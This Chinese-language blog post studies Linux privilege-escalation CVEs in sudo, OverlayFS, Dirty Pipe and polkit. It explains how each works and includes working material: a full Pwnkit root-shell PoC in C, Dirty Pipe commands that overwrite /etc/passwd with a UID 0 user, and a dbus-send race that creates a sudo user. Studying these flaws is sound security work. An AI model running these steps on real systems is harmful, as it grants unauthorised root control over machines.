---
title: "智取高地：Linux 提权漏洞学习"
date: 2023-10-11
tags:
  - Linux
categories:
  - 系统安全
---

了解一些常见的提权漏洞。

<!--more-->

## sudo 相关

### CVE-2019-14287

> 适用范围：sudo < 1.8.28

这个漏洞主要是能让一个在 sudoers 中未被授权扮演 root 的用户绕过这一限制，用户只需要输入 `sudo -u#-1 <command>` 即可扮演 root 用户，主要是由于这里的 -1（或者无符号数 4294967295）会被当作 0 读取。

### CVE-2019-18364

> 适用范围：sudo < 1.8.26

`/etc/sudoers` 文件中有一个 `pwfeedback` 选项，开启时可以使得输入密码时产生回显。绝大部分发行版中这个选项是默认关闭的。但在这个选项开启时，我们可以通过在输入密码时构造超长 payload 实现对 sudo 程序的栈溢出攻击。我们可以利用 `perl -e 'print (("A" x 100 . "\x{00}") x 50)' | sudo -S id` 这条命令来验证该栈溢出漏洞，如果出现段错误则说明漏洞存在。相关 PoC 可以参考 [saleemrashid/sudo-cve-2019-18634](https://github.com/saleemrashid/sudo-cve-2019-18634)。

### CVE-2021-3156

> 适用范围：sudo 1.8.2-1.8.31p2, 1.9.0-1.9.5p1

该漏洞无需任何错误配置或用户权限，利用了堆溢出的攻击技术。仅需一行 `sudoedit -s '\' $(python3 -c 'print("A"*1000)')` 即可验证漏洞，如果出现程序崩溃则说明漏洞存在。相关 PoC 可以参考 [blasty/CVE-2021-3156](https://github.com/blasty/CVE-2021-3156)。

## OverlayFS 提权（CVE-2021-3493）

> Linux Kernel 5.11 中修复

OverlayFS 是一个允许合并多个挂载点的内核模块，这样就可以同时访问多个文件系统内的文件。比较常见的使用场景是在一个只读文件系统上叠加（overlay）一层可写的文件系统，这样用户应用就可以对这层新的文件系统进行写操作。

Linux 文件扩展属性中有一项 file capabilities（类似 SUID-bit）决定了文件的细粒度权限。我们可以在自己的 namespace 和 mount 上定义文件的 file capabilities，但当我们通过 OverlayFS 将挂载这层 FS 到底层 FS 时，不会根据 namespace 来检查 file capabilities 是否合法。因此我们可以定义任意的 file capabilities 然后通过 OverlayFS 挂载，使得最终文件系统中该文件依然具有这些 file capabilities。[PoC](https://ssd-disclosure.com/ssd-advisory-overlayfs-pe/)

## Dirty Pipe（CVE-2022-0847）

> Linux Kernel 5.16.11, 5.15.25, 5.10.102 中修复

`splice()` 允许我们将 Linux 管道指向内存中的一页，而这一页上原本的内容可以是一个已打开的只读文件的内容。这样一来，只要向管道输入恶意数据，就可以达到修改任意一个只读文件内容的效果。但通常内核不允许我们通过管道覆盖页的内容。

幸运的是，在 [Linux Kernel v4.9(2016)](https://github.com/torvalds/linux/commit/241699cd72a8489c9446ae3910ddd243e9b9061b) 中，管道在创建时可以标记任意的 flag，在当时这并没有造成漏洞；但到了 [Linux Kernel 5.8(2020)](https://github.com/torvalds/linux/commit/f6dd975583bd8ce088400648fd9819e4691c8958)，一个新的 flag `PIPE_BUF_FLAG_CAN_MERGE` 被引入，这个 flag 会让内核允许一个页上的内容被覆盖。这样最终就使得我们可以写入任意一个我们有权限读取的文件。

如何利用该漏洞提权呢？一个简单的方法是修改 `/etc/passwd`。尽管现在用户密码哈希都存储在 `/etc/shadow`，大部分 Linux 版本还是会先检查 `/etc/passwd` 中是否存在密码哈希。这样只要写入一行 UID 和 GID 均为 `0` 的新用户条目即可。

首先生成密码哈希：

```bash
$ openssl passwd -6 --salt MERCURY "password"
```

然后拼接成新用户条目：

```
merc:$6$MERCURY$HAa.kH3beVPYs7zbph2nQI0gVs6aew8klRLxfNkgu661DvYM5gytyq9fZkgJpJ2znnS4kFiQigW2ARkOp2U3/.:0:0::/root:/bin/bash
```

接下来我们要覆写文件，由于漏洞不允许我们在文件后追加内容，我们必须挑一个用户来覆盖。但因为密码哈希长度的原因，覆写时有可能会覆盖掉多个用户，因此需要注意选取 offset 避免覆盖掉常用的用户。这里选择覆盖 `games` 用户，因为后面的 `man`、`lp` 用户也不太常用。可以通过 `grep -b` 来确定其 offset。

```bash
$ grep -b games /etc/passwd
189:games:x:5:60:games:/usr/games:/usr/sbin/nologin
```

最后备份 `/etc/passwd` 文件并运行 [exploit](https://dirtypipe.cm4all.com)（注意单引号与换行）：

```bash
$ ./exploit /etc/passwd 189 'merc:$6$MERCURY$HAa.kH3beVPYs7zbph2nQI0gVs6aew8klRLxfNkgu661DvYM5gytyq9fZkgJpJ2znnS4kFiQigW2ARkOp2U3/.:0:0::/root:/bin/bash
> '
```

一个更有趣的漏洞用法是用来覆写一个 SUID 的可执行程序，例如 `su`，向其注入 shellcode 以创建另一个 SUID 可执行文件并执行 `/bin/sh`，最后恢复被覆写的可执行程序。[PoC](https://haxx.in/files/dirtypipez.c)

## Polkit 相关

### Pwnkit（CVE-2021-4034）

主流 Linux 发行版中都已安装了 Polkit 这个 Linux 鉴权工具，它提供了相比 sudo 更细粒度的权限控制机制，其中一个常用的工具就是 pkexec，也就是受该漏洞影响的工具。

这个漏洞是一个典型的数组下标越界漏洞，pkexec 在处理参数时从第 1 个参数开始处理（第 0 个是 pkexec 可执行文件本身）：

```c
for (n = 1; n < (guint) argc; n++)
{
	// ...
}
```

但假如我们强行不设置任何参数（`execve()` 的 `argv[]` 变量设为 `{NULL}`），那么这里 `argc` 为 0，循环体不会被执行，`n` 的值维持在 1。随后的代码片段如下：

```c
path = g_strdup (argv[n]);
// ...
if (path[0] != '/')
{
	// ...
	s = g_find_program_in_path (path);
	// ...
	argv[n] = path = s;
}
```

可以看到第 8 行中 pkexec 会执行写入 `argv[n]` 的操作，此时就会写入越界下标对应内存中。但因为 `argv` 和 `envp` 数组在内存中相邻，所以此时所谓 `argv[1]` 对应的位置，恰好就位于程序运行时环境变量数组所在的内存位置 `envp[0]`，因此我们可以借助该漏洞覆盖程序运行时的环境变量，以达到提权的目的。

[PoC](https://github.com/arthepsy/CVE-2021-4034) 也非常简单：

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

char *shell =
	"#include <stdio.h>\n"
	"#include <stdlib.h>\n"
	"#include <unistd.h>\n\n"
	"void gconv() {}\n"
	"void gconv_init() {\n"
	"	setuid(0); setgid(0);\n"
	"	seteuid(0); setegid(0);\n"
	"	system(\"export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf 'GCONV_PATH=.' 'pwnkit'; /bin/sh\");\n"
	"	exit(0);\n"
	"}";

int main(int argc, char *argv[]) {
	FILE *fp;
	system("mkdir -p 'GCONV_PATH=.'; touch 'GCONV_PATH=./pwnkit'; chmod a+x 'GCONV_PATH=./pwnkit'");
	system("mkdir -p pwnkit; echo 'module UTF-8// PWNKIT// pwnkit 2' > pwnkit/gconv-modules");
	fp = fopen("pwnkit/pwnkit.c", "w");
	fprintf(fp, "%s", shell);
	fclose(fp);
	system("gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC");
	char *env[] = { "pwnkit", "PATH=GCONV_PATH=.", "CHARSET=PWNKIT", "SHELL=pwnkit", NULL };
	execve("/usr/bin/pkexec", (char*[]){NULL}, env);
}
```

PoC 的核心思路是设置不安全环境变量 `GCONV_PATH`，利用 glibc 的 `iconv_open()` 函数加载我们自定义的 .so 文件，实现恶意代码执行。但我们知道，不安全环境变量，例如 `LD_PRELOAD` 和 `GCONV_PATH` 等，在 SUID 程序中会被 ld.so 移除。因此我们需要借助这个漏洞来重新引入 `GCONV_PATH`。要解决的问题有两个：

#### 1. 如何调用 `iconv_open()`？

pkexec 的代码中，在上面的越界写入代码后很快就会清除所有环境变量，这就让我们越界写环境变量的操作失去作用了。幸运的是，在清除前 `validate_environment_variable()` 会被调用，这个函数如果检测到 `SHELL` 环境变量不合法就会调用 `g_printerr()` 函数。

`g_printerr()` 默认使用 UTF-8 编码，但设置了环境变量 `CHARSET` 时会使用指定的编码输出，其中的编码转换过程会调用 glibc 的 `iconv_open()` 函数。这个函数转换编码的方式是通过加载动态链接库（.so 文件）实现的，默认用的是 `/usr/lib/gconv/gconv-modules`。当然，我们也可以通过 `GCONV_PATH` 环境变量来改成自己的目录。

#### 2. 如何重新引入 `GCONV_PATH`？

PoC 中首先创建了一个名为 `GCONV_PATH=.` 的目录，随后在目录下创建名为 `pwnkit` 的文件并赋予可执行权限，这样文件路径就拼接成了 `GCONV_PATH=./pwnkit` 这个字符串。

然后创建 `pwnkit` 目录并准备 `pwnkit/gconv-modules`（用于后续根据字符集加载 .so 文件），再将获取 root shell 的恶意代码编译为 `pwnkit/pwnkit.so`，最后通过 `execve` 向 pkexec 传入空参数数组与一系列环境变量。

pkexec 首先会读取 `argv[1]` 也就是 `envp[0]` 的值到 `path` 变量，这里是 `pwnkit`。因为 `path` 不以 `/` 开头，所以会尝试在 PATH 中查找该程序。由于我们已经设置了 PATH，所以就会到名为 `GCONV_PATH=.` 的这个目录下查找，就会找到我们刚才 `touch` 并 `chmod` 过的 `pwnkit` 文件，实际上是一个空的可执行文件。此时程序的完整路径 `GCONV_PATH=./pwnkit` 就会被写入到 `argv[1]` 也就是 `envp[0]` 中，这样就重新引入了不安全环境变量 `GCONV_PATH`。

最后，非法的 `SHELL` 触发 `g_printerr()`，后者调用 `iconv_open()`，根据 `CHARSET` 和 `GCONV_PATH` 就会定位到 `pwnkit/gconv-modules` 并加载其中的 `pwnkit.so`，最终 `gconv_init()` 和 `gconv()` 被执行。

> 参考资料：[cve-2021-4034/pwnkit.txt](https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt)

### CVE-2021-3560

在这个漏洞中，我们需要通过 dbus-daemon 向 account-daemon 发送一条创建 sudo 用户的消息，但需要在消息被 polkit 处理之前摧毁这条消息。这会使得 polkit 向 dbus-daemon 进行查询时，dbus-daemon 找不到对应的消息返回错误码，然后这个错误码会被 polkit 替换为 0，而 0 恰好对应 root 用户导致 polkit 鉴权必定成功。

首先发送 dbus 消息，使其调用 Accounts 的 CreateUser 方法创建用户，并设置 sudo 权限（`int32:1`）：

```bash
$ dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:merc string:"Description" int32:1
```

随后再次发送 dbus 消息设置用户密码，注意替换下面的 `<USER_ID>` 和 `<PASSWORD_HASH`：

```bash
$ dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User<USER_ID> org.freedesktop.Accounts.User.SetPassword string:'<PASSWORD_HASH>' string:'Password hint'
```

由于我们需要在 polkit 处理消息前摧毁这条消息，需要用到条件竞争的方法。首先用 `time` 命令测试第一条命令执行所需要的时间，我这里大约是 0.01 秒。然后我们在命令执行到大约一半的时候杀死进程即可：

```bash
$ dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:merc string:"Description" int32:1 & sleep 0.005s; kill $!
```

验证结果，新用户 ID 为 1000：

```bash
$ id merc
uid=1000(merc) gid=1000(merc) groups=1000(merc),27(sudo)
```

第二条命令如法炮制，密码为 `password`（`openssl passwd -6` 生成哈希）：

```bash
$ dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1000 org.freedesktop.Accounts.User.SetPassword string:'$6$eMS2F4oKEt4exmfY$gsTt1T.ZwcQpE1GKjTCKSkW1RVrfdI9zla0kquQ6KBHxkOqc9rIgXA6TUMPuDuDoInMnc9NDP8su.6YnHs4HL.' string:'Password hint' & sleep 0.005s; kill $!
```

随后就可以 `su merc` 并输入密码切换用户了，此时的用户具有 sudo 权限。
